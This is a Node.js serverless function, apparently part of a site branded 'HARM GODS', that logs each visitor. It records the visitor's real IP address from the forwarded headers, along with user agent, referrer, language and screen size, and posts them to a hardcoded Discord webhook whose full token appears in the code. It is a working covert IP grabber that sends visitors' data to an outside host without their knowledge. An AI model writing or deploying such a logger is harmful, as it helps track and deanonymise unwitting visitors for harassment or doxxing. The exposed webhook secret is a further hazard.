
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504974167068643351/f8XNTXBs4ZWNyS0fxQweIfp720WwO8hLjaTDRaXpBbUujtj1tE-Zi5R5VfcUHt5fAl2J'; 

module.exports = async function handler(req, res) {
  // Allow CORS from same origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { ip, userAgent, referrer, language, screenRes, timestamp } = req.body || {};

    // Also grab the real IP from Vercel headers as a fallback/verification
    const realIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || ip
      || 'Unknown';

    const payload = {
      content: null,
      embeds: [
        {
          title: '⛧ New Visitor Logged ⛧',
          color: 0x8b0000, // Dark red
          fields: [
            { name: ' IP Address', value: `\`${realIP}\``, inline: true },
            { name: ' Client IP', value: `\`${ip || 'N/A'}\``, inline: true },
            { name: ' User Agent', value: `\`\`\`${userAgent || 'N/A'}\`\`\``, inline: false },
            { name: ' Referrer', value: `\`${referrer || 'Direct'}\``, inline: true },
            { name: ' Language', value: `\`${language || 'N/A'}\``, inline: true },
            { name: ' Screen', value: `\`${screenRes || 'N/A'}\``, inline: true },
          ],
          footer: { text: 'HARM GODS  Visitor Logger' },
          timestamp: timestamp || new Date().toISOString(),
        },
      ],
    };

    const webhookRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!webhookRes.ok) {
      const errText = await webhookRes.text();
      console.error('Webhook error:', errText);
      return res.status(502).json({ error: 'Webhook delivery failed' });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Logger error:', err);
    return res.status(500).json({ error: 'Internal error' });
  }
}
